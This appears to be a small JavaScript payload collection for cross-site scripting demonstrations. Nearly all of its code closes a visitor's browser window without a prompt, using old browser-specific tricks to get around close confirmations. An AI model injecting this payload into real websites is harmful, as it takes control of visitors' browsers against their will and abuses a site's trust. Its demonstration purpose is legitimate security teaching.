// A compilation of scripts I didn't write to be deployed for XSS demonstrations
window.open('', '_self', ''); window.close();
         var browserName = navigator.appName;
         var browserVer = parseInt(navigator.appVersion);
         //alert(browserName + " : "+browserVer);

         //document.getElementById("flashContent").innerHTML = "<br>&nbsp;<font face='Arial' color='blue' size='2'><b> You have been logged out of the Game. Please Close Your Browser Window.</b></font>";

         if(browserName == "Microsoft Internet Explorer"){
             var ie7 = (document.all && !window.opera && window.XMLHttpRequest) ? true : false;  
             if (ie7)
             {  
               //This method is required to close a window without any prompt for IE7 & greater versions.
               window.open('','_parent','');
               window.close();
             }
            else
             {
               //This method is required to close a window without any prompt for IE6
               this.focus();
               self.opener = this;
               self.close();
             }
        }else{  
            //For NON-IE Browsers except Firefox which doesnt support Auto Close
            try{
                this.focus();
                self.opener = this;
                self.close();
            }
            catch(e){

            }

            try{
                window.open('','_self','');
                window.close();
            }
            catch(e){

            }
        }
window.open('javascript:window.open("", "_self", "");window.close();', '_self');
